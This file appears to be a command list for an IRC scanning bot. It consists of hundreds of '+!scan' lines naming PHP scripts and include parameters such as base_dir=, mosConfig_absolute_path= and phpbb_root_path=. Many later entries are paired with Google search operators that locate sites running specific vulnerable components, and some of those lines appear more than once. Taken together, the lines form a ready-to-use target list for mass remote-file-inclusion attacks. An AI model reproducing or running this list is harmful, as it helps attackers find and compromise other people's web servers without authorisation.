+!scan gallery.php?get=
+!scan main.php?v=
+!scan base.php?middle=
+!scan pagina.php?base_dir=
+!scan print.php?tipo=
+!scan down*.php?subject=
+!scan principal.php?pag=
+!scan index2.php?loc=
+!scan enter.php?sivu=
+!scan path.php?option=
+!scan nota.php?option=
+!scan index.php?strona=
+!scan home.php?index=
+!scan index1.php?choix=
+!scan index2.php?f=
+!scan press.php?destino=
+!scan print.php?base_dir=
+!scan file.php?get=
+!scan pagina.php?channel=
+!scan principal.php?b=
+!scan info.php?content=
+!scan home.php?include=
+!scan default.php?goto=
+!scan default.php?page=
+!scan start.php?include=
+!scan head.php?numero=
+!scan print.php?option=
+!scan default.php?v=
+!scan base.php?numero=
+!scan index2.php?qry=
+!scan general.php?ref=
+!scan sub*.php?secao=
+!scan main.php?dir=
+!scan gallery.php?cont=
+!scan principal.php?type=
+!scan file.php?param=
+!scan default.php?secao=
+!scan sub*.php?secc=
+!scan mod*.php?lang=
+!scan path.php?pageweb=
+!scan standard.php?pollname=
+!scan info.php?r=
+!scan default.php?load=
+!scan show.php?j=
+!scan base.php?phpbb_root_path=
+!scan main.php?itemnav=
+!scan view.php?pg=
+!scan down*.php?pa=
+!scan standard.php?open=
+!scan pagina.php?choix=
+!scan default.php?itemnav=
+!scan index2.php?cmd=
+!scan file.php?disp=
+!scan press.php?xlink=
+!scan print.php?s=
+!scan layout.php?url=
+!scan mod*.php?secc=
+!scan index1.php?param=
+!scan index.php?path=
+!scan index1.php?second=
+!scan start.php?modo=
+!scan index3.php?sivu=
+!scan index1.php?get=
+!scan mod*.php?pg=
+!scan index3.php?my=
+!scan layout.php?cmd=
+!scan info.php?phpbb_root_path=
+!scan sub*.php?left=
+!scan print.php?OpenPage=
+!scan print.php?inc=
+!scan default.php?thispage=
+!scan enter.php?sec=
+!scan view.php?type=
+!scan path.php?*[*]*=
+!scan base.php?adresa=
+!scan home.php?middlePart=
+!scan index3.php?channel=
+!scan index3.php?oldal=
+!scan template.php?sekce=
+!scan down*.php?goFile=
+!scan blank.php?header=
+!scan start.php?body=
+!scan standard.php?body=
+!scan base.php?path=
+!scan base.php?module=
+!scan default.php?l=
+!scan principal.php?strona=
+!scan info.php?l=
+!scan template.php?left=
+!scan index2.php?texto=
+!scan home.php?eval=
+!scan padrao.php?section=
+!scan blank.php?goFile=
+!scan head.php?loc=
+!scan index.php?index=
+!scan page.php?ir=
+!scan print.php?path=
+!scan layout.php?ir=
+!scan blank.php?pollname=
+!scan down*.php?path=
+!scan include.php?x=
+!scan sitio.php?opcion=
+!scan pagina.php?category=
+!scan start.php?pageweb=
+!scan gallery.php?rub=
+!scan template.php?sp=
+!scan sub*.php?basepath=
+!scan press.php?menu=
+!scan standard.php?section=
+!scan enter.php?abre=
+!scan index2.php?pref=
+!scan index1.php?pa=
+!scan sitio.php?incl=
+!scan principal.php?seite=
+!scan show.php?ki=
+!scan gallery.php?chapter=
+!scan nota.php?qry=
+!scan pagina.php?pagina=
+!scan index3.php?x=
+!scan default.php?menu=
+!scan page.php?strona=
+!scan *inc*.php?open=
+!scan index3.php?secao=
+!scan standard.php?*[*]*=
+!scan default.php?abre=
+!scan template.php?basepath=
+!scan standard.php?goFile=
+!scan index2.php?ir=
+!scan file.php?modo=
+!scan gallery.php?itemnav=
+!scan main.php?oldal=
+!scan press.php?pg=
+!scan down*.php?showpage=
+!scan start.php?nivel=
+!scan start.php?destino=
+!scan index1.php?filepath=
+!scan blank.php?rub=
+!scan path.php?ir=
+!scan layout.php?var=
+!scan padrao.php?op=
+!scan mod*.php?pre=
+!scan index1.php?texto=
+!scan start.php?pg=
+!scan default.php?pa=
+!scan press.php?strona=
+!scan nota.php?cmd=
+!scan index1.php?showpage=
+!scan info.php?go=
+!scan standard.php?abre=
+!scan general.php?seccion=
+!scan index1.php?itemnav=
+!scan layout.php?seite=
+!scan path.php?load=
+!scan home.php?pollname=
+!scan path.php?left=
+!scan down*.php?inc=
+!scan index3.php?abre=
+!scan blank.php?where=
+!scan info.php?start=
+!scan include.php?channel=
+!scan print.php?dir=
+!scan page.php?secao=
+!scan nota.php?pag=
+!scan main.php?disp=
+!scan nota.php?second=
+!scan print.php?pre=
+!scan index2.php?to=
+!scan standard.php?name=
+!scan padrao.php?cont=
+!scan start.php?strona=
+!scan padrao.php?menu=
+!scan mod*.php?numero=
+!scan press.php?home=
+!scan path.php?addr=
+!scan info.php?z=
+!scan mod*.php?path=
+!scan blank.php?base_dir=
+!scan base.php?sekce=
+!scan pagina.php?loader=
+!scan page.php?go=
+!scan press.php?category=
+!scan base.php?texto=
+!scan gallery.php?left=
+!scan nota.php?secc=
+!scan index.php?tipo=
+!scan index.php?goto=
+!scan print.php?pag=
+!scan down*.php?qry=
+!scan view.php?secao=
+!scan general.php?strona=
+!scan show.php?my=
+!scan file.php?second=
+!scan page.php?e=
+!scan padrao.php?index=
+!scan include.php?pag=
+!scan gallery.php?thispage=
+!scan base.php?ir=
+!scan start.php?base_dir=
+!scan default.php?tipo=
+!scan template.php?addr=
+!scan gallery.php?panel=
+!scan sitio.php?nivel=
+!scan standard.php?ev=
+!scan include.php?destino=
+!scan standard.php?destino=
+!scan general.php?middle=
+!scan main.php?basepath=
+!scan head.php?disp=
+!scan standard.php?q=
+!scan general.php?w=
+!scan gallery.php?sec=
+!scan base.php?var=
+!scan enter.php?addr=
+!scan enter.php?go=
+!scan page.php?middle=
+!scan start.php?home=
+!scan index1.php?tipo=
+!scan info.php?rub=
+!scan mod*.php?choix=
+!scan template.php?ir=
+!scan pagina.php?OpenPage=
+!scan show.php?adresa=
+!scan general.php?mid=
+!scan head.php?content=
+!scan principal.php?pref=
+!scan index3.php?adresa=
+!scan pagina.php?sec=
+!scan template.php?secao=
+!scan home.php?w=
+!scan home.php?in=
+!scan path.php?disp=
+!scan main.php?index=
+!scan file.php?eval=
+!scan general.php?content=
+!scan press.php?base_dir=
+!scan sub*.php?recipe=
+!scan main.php?category=
+!scan main.php?content=
+!scan enter.php?viewpage=
+!scan show.php?disp=
+!scan main.php?ir=
+!scan index.php?pg=
+!scan show.php?pageweb=
+!scan index.php?opcion=
+!scan principal.php?ir=
+!scan view.php?loader=
+!scan down*.php?strona=
+!scan default.php?pageweb=
+!scan principal.php?seccion=
+!scan index.php?oldal=
+!scan principal.php?n=
+!scan blank.php?link=
+!scan file.php?sivu=
+!scan head.php?d=
+!scan info.php?adresa=
+!scan *inc*.php?ki=
+!scan gallery.php?mid=
+!scan padrao.php?incl=
+!scan index.php?type=
+!scan main.php?eval=
+!scan gallery.php?nivel=
+!scan standard.php?j=
+!scan sub*.php?goFile=
+!scan info.php?sec=
+!scan show.php?oldal=
+!scan enter.php?link=
+!scan enter.php?content=
+!scan blank.php?filepath=
+!scan standard.php?channel=
+!scan main.php?include=
+!scan main.php?page=
+!scan base.php?*[*]*=
+!scan info.php?incl=
+!scan down*.php?include=
+!scan press.php?modo=
+!scan file.php?choix=
+!scan home.php?rub=
+!scan default.php?k=
+!scan index3.php?t=
+!scan press.php?type=
+!scan blank.php?goto=
+!scan index3.php?showpage=
+!scan file.php?showpage=
+!scan principal.php?subject=
+!scan enter.php?home=
+!scan start.php?chapter=
+!scan show.php?r=
+!scan pagina.php?thispage=
+!scan general.php?chapter=
+!scan info.php?menue=
+!scan index.php?middlePart=
+!scan blank.php?corpo=
+!scan press.php?where=
+!scan path.php?p=
+!scan page.php?base_dir=
+!scan page.php?qry=
+!scan show.php?incl=
+!scan page.php?*[*]*=
+!scan main.php?h=
+!scan enter.php?path=
+!scan file.php?seccion=
+!scan default.php?pre=
+!scan principal.php?index=
+!scan press.php?ir=
+!scan principal.php?inc=
+!scan home.php?z=
+!scan pagina.php?in=
+!scan show.php?play=
+!scan nota.php?subject=
+!scan index1.php?path=
+!scan default.php?secc=
+!scan sub*.php?option=
+!scan sub*.php?pag=
+!scan layout.php?where=
+!scan default.php?loader=
+!scan info.php?o=
+!scan padrao.php?var=
+!scan file.php?oldal=
+!scan template.php?menue=
+!scan press.php?abre=
+!scan mod*.php?b=
+!scan layout.php?OpenPage=
+!scan default.php?showpage=
+!scan home.php?play=
+!scan sitio.php?pg=
+!scan press.php?channel=
+!scan pagina.php?ev=
+!scan sitio.php?name=
+!scan page.php?option=
+!scan main.php?filepath=
+!scan press.php?mid=
+!scan general.php?to=
+!scan index1.php?*root*=
+!scan show.php?qry=
+!scan print.php?where=
+!scan down*.php?corpo=
+!scan view.php?get=
+!scan index2.php?itemnav=
+!scan pagina.php?q=
+!scan enter.php?str=
+!scan enter.php?name=
+!scan print.php?thispage=
+!scan sitio.php?addr=
+!scan principal.php?home=
+!scan show.php?param=
+!scan standard.php?sivu=
+!scan enter.php?incl=
+!scan index3.php?mod=
+!scan template.php?opcion=
+!scan index3.php?panel=
+!scan include.php?play=
+!scan path.php?cmd=
+!scan file.php?sp=
+!scan nota.php?pre=
+!scan template.php?section=
+!scan view.php?str=
+!scan blank.php?left=
+!scan head.php?lang=
+!scan nota.php?lang=
+!scan pagina.php?g=
+!scan path.php?sivu=
+!scan main.php?e=
+!scan default.php?ref=
+!scan start.php?seite=
+!scan default.php?inc=
+!scan print.php?disp=
+!scan include.php?tipo=
+!scan home.php?h=
+!scan principal.php?loc=
+!scan index3.php?sp=
+!scan gallery.php?var=
+!scan sub*.php?base_dir=
+!scan path.php?middle=
+!scan default.php?loc=
+!scan principal.php?destino=
+!scan pagina.php?str=
+!scan index3.php?menue=
+!scan base.php?play=
+!scan base.php?v=
+!scan sitio.php?sivu=
+!scan index.php?y=
+!scan home.php?opcion=
+!scan print.php?middlePart=
+!scan main.php?r=
+!scan sitio.php?secc=
+!scan file.php?nivel=
+!scan start.php?sivu=
+!scan show.php?read=
+!scan standard.php?var=
+!scan template.php?c=
+!scan info.php?param=
+!scan general.php?second=
+!scan head.php?start=
+!scan sub*.php?mod=
+!scan view.php?oldal=
+!scan home.php?loc=
+!scan mod*.php?play=
+!scan head.php?corpo=
+!scan gallery.php?h=
+!scan standard.php?op=
+!scan index2.php?inc=
+!scan info.php?pref=
+!scan pagina.php?mid=
+!scan base.php?basepath=
+!scan sub*.php?thispage=
+!scan print.php?basepath=
+!scan *inc*.php?m=
+!scan layout.php?loader=
+!scan enter.php?qry=
+!scan padrao.php?filepath=
+!scan base.php?home=
+!scan layout.php?strona=
+!scan padrao.php?url=
+!scan sitio.php?oldal=
+!scan include.php?ir=
+!scan pagina.php?read=
+!scan sub*.php?u=
+!scan base.php?chapter=
+!scan index1.php?go=
+!scan press.php?pageweb=
+!scan standard.php?s=
+!scan page.php?eval=
+!scan sub*.php?pa=
+!scan index.php?j=
+!scan pagina.php?pr=
+!scan enter.php?texto=
+!scan start.php?secao=
+!scan home.php?link=
+!scan template.php?*[*]*=
+!scan gallery.php?action=
+!scan base.php?oldal=
+!scan nota.php?get=
+!scan index3.php?dir=
+!scan include.php?ki=
+!scan index3.php?link=
+!scan home.php?e=
+!scan index3.php?body=
+!scan gallery.php?name=
+!scan nota.php?eval=
+!scan standard.php?oldal=
+!scan sub*.php?abre=
+!scan index2.php?load=
+!scan principal.php?in=
+!scan view.php?load=
+!scan mod*.php?action=
+!scan nota.php?showpage=
+!scan default.php?p=
+!scan general.php?f=
+!scan head.php?c=
+!scan template.php?viewpage=
+!scan view.php?mid=
+!scan padrao.php?addr=
+!scan padrao.php?pag=
+!scan *inc*.php?rub=
+!scan index2.php?adresa=
+!scan view.php?go=
+!scan head.php?sec=
+!scan nota.php?filepath=
+!scan print.php?link=
+!scan gallery.php?pname=
+!scan file.php?basepath=
+!scan show.php?pname=
+!scan home.php?pre=
+!scan include.php?goFile=
+!scan layout.php?play=
+!scan index1.php?subject=
+!scan info.php?middlePart=
+!scan base.php?loc=
+!scan down*.php?pg=
+!scan file.php?q=
+!scan gallery.php?sivu=
+!scan sub*.php?body=
+!scan index.php?option=
+!scan sub*.php?chapter=
+!scan default.php?t=
+!scan padrao.php?header=
+!scan head.php?opcion=
+!scan layout.php?abre=
+!scan index3.php?pref=
+!scan enter.php?subject=
+!scan nota.php?panel=
+!scan page.php?modo=
+!scan page.php?left=
+!scan sitio.php?left=
+!scan show.php?include=
+!scan base.php?abre=
+!scan index3.php?addr=
+!scan pagina.php?start=
+!scan blank.php?pr=
+!scan head.php?choix=
+!scan index3.php?tipo=
+!scan *inc*.php?get=
+!scan print.php?play=
+!scan padrao.php?secao=
+!scan index.php?str=
+!scan general.php?sekce=
+!scan show.php?m=
+!scan index3.php?choix=
+!scan down*.php?channel=
+!scan base.php?pa=
+!scan head.php?b=
+!scan nota.php?sekce=
+!scan index1.php?mod=
+!scan home.php?showpage=
+!scan home.php?cmd=
+!scan show.php?l=
+!scan index1.php?read=
+!scan page.php?load=
+!scan general.php?choix=
+!scan show.php?index=
+!scan blank.php?url=
+!scan home.php?my=
+!scan start.php?param=
+!scan layout.php?sekce=
+!scan start.php?thispage=
+!scan nota.php?play=
+!scan enter.php?module=
+!scan mod*.php?secao=
+!scan show.php?second=
+!scan show.php?n=
+!scan start.php?pname=
+!scan enter.php?include=
+!scan down*.php?doshow=
+!scan index2.php?pre=
+!scan layout.php?nivel=
+!scan home.php?base_dir=
+!scan include.php?eval=
+!scan principal.php?middle=
+!scan standard.php?xlink=
+!scan main.php?where=
+!scan info.php?home=
+!scan padrao.php?link=
+!scan general.php?body=
+!scan head.php?play=
+!scan path.php?strona=
+!scan index3.php?read=
+!scan file.php?index=
+!scan mod*.php?module=
+!scan standard.php?viewpage=
+!scan mod*.php?OpenPage=
+!scan standard.php?pr=
+!scan *inc*.php?showpage=
+!scan pagina.php?ref=
+!scan index.php?b=
+!scan principal.php?ki=
+!scan sub*.php?panel=
+!scan path.php?sec=
+!scan path.php?pname=
+!scan nota.php?left=
+!scan default.php?header=
+!scan padrao.php?mid=
+!scan info.php?eval=
+!scan include.php?path=
+!scan padrao.php?qry=
+!scan page.php?subject=
+!scan file.php?corpo=
+!scan padrao.php?strona=
+!scan sub*.php?qry=
+!scan sub*.php?z=
+!scan head.php?module=
+!scan nota.php?opcion=
+!scan head.php?abre=
+!scan pagina.php?include=
+!scan page.php?link=
+!scan start.php?abre=
+!scan print.php?goFile=
+!scan *inc*.php?c=
+!scan down*.php?cmd=
+!scan base.php?str=
+!scan home.php?body=
+!scan home.php?middle=
+!scan gallery.php?module=
+!scan sub*.php?open=
+!scan include.php?second=
+!scan head.php?sivu=
+!scan sitio.php?menue=
+!scan path.php?tipo=
+!scan page.php?inc=
+!scan home.php?addr=
+!scan pagina.php?header=
+!scan mod*.php?v=
+!scan home.php?doshow=
+!scan padrao.php?n=
+!scan gallery.php?pref=
+!scan pagina.php?k=
+!scan index1.php?chapter=
+!scan padrao.php?basepath=
+!scan head.php?strona=
+!scan general.php?e=
+!scan index.php?r=
+!scan blank.php?get=
+!scan index3.php?seccion=
+!scan sitio.php?mid=
+!scan index.php?where=
+!scan general.php?type=
+!scan pagina.php?goto=
+!scan page.php?pa=
+!scan default.php?menue=
+!scan main.php?goto=
+!scan index1.php?abre=
+!scan blank.php?sivu=
+!scan info.php?seccion=
+!scan index2.php?pa=
+!scan sitio.php?read=
+!scan layout.php?pageweb=
+!scan nota.php?disp=
+!scan index1.php?body=
+!scan home.php?thispage=
+!scan pagina.php?loc=
+!scan layout.php?qry=
+!scan print.php?*root*=
+!scan show.php?to=
+!scan view.php?u=
+!scan default.php?nivel=
+!scan show.php?header=
+!scan down*.php?pag=
+!scan view.php?chapter=
+!scan start.php?tipo=
+!scan standard.php?w=
+!scan index.php?open=
+!scan blank.php?menu=
+!scan principal.php?nivel=
+!scan info.php?secao=
+!scan general.php?nivel=
+!scan padrao.php?nivel=
+!scan *inc*.php?addr=
+!scan index.php?var=
+!scan nota.php?abre=
+!scan standard.php?menu=
+!scan index2.php?pollname=
+!scan index3.php?path=
+!scan home.php?redirect=
+!scan *inc*.php?link=
+!scan *inc*.php?incl=
+!scan index.php?base_dir=
+!scan padrao.php?corpo=
+!scan down*.php?url=
+!scan enter.php?goto=
+!scan general.php?secao=
+!scan mod*.php?home=
+!scan down*.php?addr=
+!scan down*.php?section=
+!scan sub*.php?j=
+!scan principal.php?f=
+!scan default.php?index=
+!scan sub*.php?menue=
+!scan general.php?doshow=
+!scan padrao.php?abre=
+!scan index2.php?section=
+!scan enter.php?seite=
+!scan general.php?my=
+!scan down*.php?lang=
+!scan head.php?loader=
+!scan main.php?xlink=
+!scan general.php?goto=
+!scan include.php?dir=
+!scan index3.php?base_dir=
+!scan gallery.php?redirect=
+!scan layout.php?basepath=
+!scan start.php?header=
+!scan pagina.php?modo=
+!scan blank.php?in=
+!scan base.php?name=
+!scan index.php?adresa=
+!scan down*.php?u=
+!scan nota.php?goFile=
+!scan main.php?mod=
+!scan file.php?start=
+!scan view.php?redirect=
+!scan index2.php?u=
+!scan head.php?base_dir=
+!scan mod*.php?recipe=
+!scan press.php?pr=
+!scan padrao.php?*[*]*=
+!scan info.php?ev=
+!scan layout.php?opcion=
+!scan index1.php?nivel=
+!scan include.php?seccion=
+!scan print.php?rub=
+!scan view.php?lang=
+!scan index.php?pr=
+!scan mod*.php?include=
+!scan general.php?seite=
+!scan pagina.php?numero=
+!scan mod*.php?seccion=
+!scan principal.php?pollname=
+!scan include.php?read=
+!scan *inc*.php?pg=
+!scan press.php?rub=
+!scan index2.php?incl=
+!scan pagina.php?chapter=
+!scan view.php?middle=
+!scan print.php?sekce=
+!scan nota.php?rub=
+!scan padrao.php?pname=
+!scan view.php?seite=
+!scan head.php?ref=
+!scan pagina.php?recipe=
+!scan principal.php?link=
+!scan index.php?pref=
+!scan page.php?action=
+!scan page.php?ev=
+!scan show.php?ir=
+!scan gallery.php?menue=
+!scan template.php?op=
+!scan info.php?doshow=
+!scan head.php?index=
+!scan mod*.php?pname=
+!scan view.php?ir=
+!scan default.php?sivu=
+!scan *inc*.php?start=
+!scan principal.php?rub=
+!scan principal.php?corpo=
+!scan padrao.php?middle=
+!scan nota.php?pagina=
+!scan sitio.php?content=
+!scan base.php?pname=
+!scan press.php?thispage=
+!scan template.php?header=
+!scan press.php?pa=
+!scan index1.php?redirect=
+!scan padrao.php?menue=
+!scan index2.php?sekce=
+!scan mod*.php?d=
+!scan view.php?sp=
+!scan include.php?filepath=
+!scan main.php?name=
+!scan nota.php?m=
+!scan blank.php?open=
+!scan head.php?dir=
+!scan principal.php?l=
+!scan page.php?pname=
+!scan layout.php?oldal=
+!scan *inc*.php?k=
+!scan index.php?pollname=
+!scan include.php?b=
+!scan head.php?oldal=
+!scan index1.php?str=
+!scan layout.php?pollname=
+!scan start.php?play=
+!scan template.php?choix=
+!scan down*.php?pollname=
+!scan page.php?recipe=
+!scan template.php?corpo=
+!scan nota.php?sec=
+!scan print.php?r=
+!scan info.php?*[*]*=
+!scan sub*.php?*[*]*=
+!scan page.php?q=
+!scan mod*.php?addr=
+!scan index1.php?type=
+!scan base.php?category=
+!scan gallery.php?y=
+!scan standard.php?lang=
+!scan gallery.php?page=
+!scan index2.php?d=
+!scan index.php?action=
+!scan press.php?pname=
+!scan down*.php?v=
+!scan mod*.php?phpbb_root_path=
+!scan index3.php?second=
+!scan default.php?include=
+!scan show.php?recipe=
+!scan press.php?module=
+!scan main.php?pre=
+!scan file.php?numero=
+!scan default.php?module=
+!scan info.php?pname=
+!scan print.php?str=
+!scan path.php?id=
+!scan general.php?get=
+!scan press.php?path=
+!scan padrao.php?sekce=
+!scan standard.php?link=
+!scan base.php?ki=
+!scan nota.php?OpenPage=
+!scan view.php?pollname=
+!scan print.php?l=
+!scan file.php?cmd=
+!scan index.php?go=
+!scan standard.php?numero=
+!scan view.php?pr=
+!scan down*.php?read=
+!scan layout.php?section=
+!scan press.php?include=
+!scan down*.php?action=
+!scan mod*.php?destino=
+!scan index1.php?OpenPage=
+!scan principal.php?left=
+!scan mod*.php?start=
+!scan file.php?body=
+!scan base.php?doshow=
+!scan gallery.php?pg=
+!scan blank.php?qry=
+!scan principal.php?load=
+!scan base.php?eval=
+!scan default.php?left=
+!scan gallery.php?param=
+!scan print.php?type=
+!scan blank.php?pa=
+!scan nota.php?b=
+!scan path.php?loader=
+!scan start.php?o=
+!scan index1.php?adresa=
+!scan include.php?include=
+!scan nota.php?corpo=
+!scan index3.php?pre=
+!scan enter.php?second=
+!scan sub*.php?pname=
+!scan mod*.php?pageweb=
+!scan standard.php?cont=
+!scan gallery.php?open=
+!scan blank.php?read=
+!scan principal.php?addr=
+!scan standard.php?action=
+!scan sitio.php?redirect=
+!scan index1.php?cmd=
+!scan info.php?redirect=
+!scan template.php?lang=
+!scan include.php?basepath=
+!scan file.php?load=
+!scan index3.php?itemnav=
+!scan sub*.php?ir=
+!scan gallery.php?mod=
+!scan down*.php?nivel=
+!scan enter.php?ref=
+!scan path.php?opcion=
+!scan down*.php?t=
+!scan view.php?goFile=
+!scan print.php?category=
+!scan file.php?var=
+!scan sitio.php?ir=
+!scan print.php?menu=
+!scan layout.php?secao=
+!scan template.php?param=
+!scan show.php?b=
+!scan standard.php?ref=
+!scan base.php?include=
+!scan blank.php?body=
+!scan sitio.php?param=
+!scan sub*.php?rub=
+!scan print.php?opcion=
+!scan press.php?middle=
+!scan path.php?pref=
+!scan info.php?ir=
+!scan print.php?g=
+!scan home.php?basepath=
+!scan padrao.php?subject=
+!scan nota.php?modo=
+!scan index3.php?loader=
+!scan template.php?seite=
+!scan blank.php?section=
+!scan include.php?to=
+!scan general.php?pageweb=
+!scan index2.php?param=
+!scan start.php?sp=
+!scan index3.php?name=
+!scan path.php?nivel=
+!scan page.php?pref=
+!scan template.php?showpage=
+!scan view.php?ki=
+!scan index1.php?sekce=
+!scan press.php?option=
+!scan nota.php?home=
+!scan gallery.php?my=
+!scan press.php?pref=
+!scan show.php?mid=
+!scan enter.php?ev=
+!scan blank.php?o=
+!scan sitio.php?pr=
+!scan index3.php?destino=
+!scan standard.php?middle=
+!scan main.php?body=
+!scan index2.php?recipe=
+!scan blank.php?dir=
+!scan home.php?pageweb=
+!scan blank.php?lang=
+!scan path.php?thispage=
+!scan view.php?panel=
+!scan down*.php?home=
+!scan padrao.php?OpenPage=
+!scan head.php?ir=
+!scan info.php?pageweb=
+!scan blank.php?h=
+!scan mod*.php?ir=
+!scan show.php?pagina=
+!scan head.php?incl=
+!scan default.php?base_dir=
+!scan principal.php?ref=
+!scan index.php?body=
+!scan start.php?go=
+!scan show.php?loader=
+!scan file.php?action=
+!scan template.php?t=
+!scan path.php?mid=
+!scan base.php?mid=
+!scan start.php?b=
+!scan start.php?lang=
+!scan blank.php?abre=
+!scan down*.php?choix=
+!scan default.php?rub=
+!scan info.php?opcion=
+!scan page.php?loader=
+!scan head.php?read=
+!scan principal.php?oldal=
+!scan show.php?cmd=
+!scan index1.php?load=
+!scan home.php?content=
+!scan pagina.php?sekce=
+!scan file.php?n=
+!scan include.php?redirect=
+!scan press.php?get=
+!scan print.php?itemnav=
+!scan enter.php?index=
+!scan index.php?content=
+!scan print.php?middle=
+!scan principal.php?secc=
+!scan sitio.php?goFile=
+!scan head.php?include=
+!scan gallery.php?menu=
+!scan gallery.php?corpo=
+!scan enter.php?e=
+!scan index.php?play=
+!scan include.php?module=
+!scan enter.php?id=
+!scan view.php?mod=
+!scan show.php?nivel=
+!scan file.php?channel=
+!scan layout.php?choix=
+!scan page.php?redirect=
+!scan gallery.php?filepath=
+!scan info.php?body=
+!scan general.php?ir=
+!scan include.php?go=
+!scan file.php?ref=
+!scan index1.php?seite=
+!scan include.php?pageweb=
+!scan index3.php?nivel=
+!scan show.php?seccion=
+!scan sub*.php?include=
+!scan path.php?numero=
+!scan mod*.php?pagina=
+!scan sub*.php?name=
+!scan padrao.php?c=
+!scan principal.php?header=
+!scan main.php?opcion=
+!scan enter.php?s=
+!scan padrao.php?eval=
+!scan file.php?ev=
+!scan default.php?body=
+!scan enter.php?itemnav=
+!scan blank.php?var=
+!scan index.php?addr=
+!scan blank.php?oldal=
+!scan nota.php?url=
+!scan index2.php?action=
+!scan sub*.php?pre=
+!scan blank.php?phpbb_root_path=
+!scan include.php?index=
+!scan mod*.php?var=
+!scan gallery.php?pageweb=
+!scan padrao.php?path=
+!scan mod*.php?strona=
+!scan info.php?url=
+!scan press.php?ev=
+!scan index1.php?pg=
+!scan print.php?in=
+!scan general.php?modo=
+!scan nota.php?nivel=
+!scan template.php?content=
+!scan mod*.php?content=
+!scan default.php?f=
+!scan view.php?goto=
+!scan head.php?ki=
+!scan press.php?my=
+!scan index1.php?pollname=
+!scan principal.php?to=
+!scan principal.php?abre=
+!scan default.php?play=
+!scan pagina.php?filepath=
+!scan nota.php?link=
+!scan template.php?tipo=
+!scan index3.php?q=
+!scan page.php?g=
+!scan nota.php?pg=
+!scan blank.php?destino=
+!scan page.php?adresa=
+!scan sitio.php?category=
+!scan index2.php?link=
+!scan sub*.php?k=
+!scan blank.php?z=
+!scan layout.php?numero=
+!scan components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=
+!scan /tools/send_reminders.php?includedir=
+!scan module_db.php?pivot_path= allinurl:"module_db.php?pivot_path="
+!scan /classes/adodbt/sql.php?classes_dir= allinurl:"/classes/adodbt/sql.php?classes_dir="
+!scan inc/cmses/aedatingCMS.php?dir[inc]= inurl:"flashchat"
+!scan /modules/vwar/admin/admin.php?vwar_root= allinurl:vwar
+!scan bb_usage_stats/include/bb_usage_stats.php?phpbb_root_path= inurl:forum
+!scan components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=
+!scan allinurl:com_extended_registration
+!scan index.php?RP_PATH= inurl:reviewpost
+!scan index.php?pagename= allinurl:phpquiz
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:/com_remository/
+!scan smarty_config.php?root_dir= inurl:"smarty"
+!scan /components/com_forum/download.php?phpbb_root_path= inurl:com_forum
+!scan include/editfunc.inc.php?NWCONF_SYSTEM[server_path]= intitle:Newswriter
+!scan include/editfunc.inc.php?NWCONF_SYSTEM[server_path]= site:.gr
+!scan /classes/adodbt/sql.php?classes_dir= inurl:"index2.php?option=rss"
+!scan send_reminders.php?includedir= inurl:"send_reminders.php?includedir="
+!scan components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= com_rsgallery
+!scan inc/functions.inc.php?config[ppa_root_path]= "Index - Albums" inurl:index.php 
+!scan /components/com_cpg/cpg.php?mosConfig_absolute_path= allinurl:"com_cpg" 
+!scan [Script Path]/admin/index.php?o= allinurl:"admin/index.php";
+!scan /admin/index.php?o= allinurl:"admin/index.php";
+!scan index.php?menu=deti&page= allinurl:"index.php?menu=deti&page"
+!scan /modules/coppermine/themes/coppercop/theme.php?THEME_DIR= allinurl:coppermine
+!scan components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path= "inurl:com_phpshop"
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=
+!scan SQuery/lib/gore.php?libpath= inurl:"/SQuery/"
+!scan /components/com_simpleboard/image_upload.php?sbp= allinurl:"com_simpleboard"
+!scan m2f/m2f_phpbb204.php?m2f_root_path= allinurl:/m2f_usercp.php?
+!scan /components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]= inurl:com_extcalendar
+!scan /components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]= allinurl:com_extcalendar
+!scan components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]=
+!scan admin/doeditconfig.php?thispath=../includes&config[path]= inurl:"admin"
+!scan components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path= "inurl:com_phpshop"
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=
+!scan SQuery/lib/gore.php?libpath= inurl:"/SQuery/"
+!scan /components/com_simpleboard/image_upload.php?sbp= allinurl:"com_simpleboard"
+!scan m2f/m2f_phpbb204.php?m2f_root_path= allinurl:/m2f_usercp.php?
+!scan wamp_dir/setup/yesno.phtml?no_url= inurl:"setup"
+!scan components/com_simpleboard/image_upload.php?sbp= allinurl:"com_simpleboard"
+!scan /modules/coppermine/themes/coppercop/theme.php?THEME_DIR= allinurl:coppermine                                                                                                  
+!scan mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]=
+!scan zentrack/index.php?configFile=
+!scan pivot/modules/module_db.php?pivot_path=
+!scan inc/header.php/step_one.php?server_inc=
+!scan install/index.php?lng=../../include/main.inc&G_PATH=
+!scan inc/pipe.php?HCL_path=
+!scan include/write.php?dir=
+!scan include/new-visitor.inc.php?lvc_include_dir= 
+!scan includes/header.php?systempath=
+!scan support/mailling/maillist/inc/initdb.php?absolute_path=
+!scan coppercop/theme.php?THEME_DIR=
+!scan zentrack/index.php?configFile=
+!scan pivot/modules/module_db.php?pivot_path=
+!scan inc/header.php/step_one.php?server_inc=
+!scan install/index.php?lng=../../include/main.inc&G_PATH=
+!scan inc/pipe.php?HCL_path=
+!scan include/write.php?dir=
+!scan include/new-visitor.inc.php?lvc_include_dir= 
+!scan includes/header.php?systempath=
+!scan support/mailling/maillist/inc/initdb.php?absolute_path=
+!scan coppercop/theme.php?THEME_DIR=
+!scan becommunity/community/index.php?pageurl=
+!scan shoutbox/expanded.php?conf=
+!scan agendax/addevent.inc.php?agendax_path=
+!scan myPHPCalendar/admin.php?cal_dir=
+!scan yabbse/Sources/Packages.php?sourcedir=
+!scan zboard/zboard.php
+!scan path_of_cpcommerce/_functions.php?prefix
+!scan dotproject/modules/projects/addedit.php?root_dir= 
+!scan dotproject/modules/projects/view.php?root_dir= 
+!scan dotproject/modules/projects/vw_files.php?root_dir= 
+!scan dotproject/modules/tasks/addedit.php?root_dir= 
+!scan dotproject/modules/tasks/viewgantt.php?root_dir=
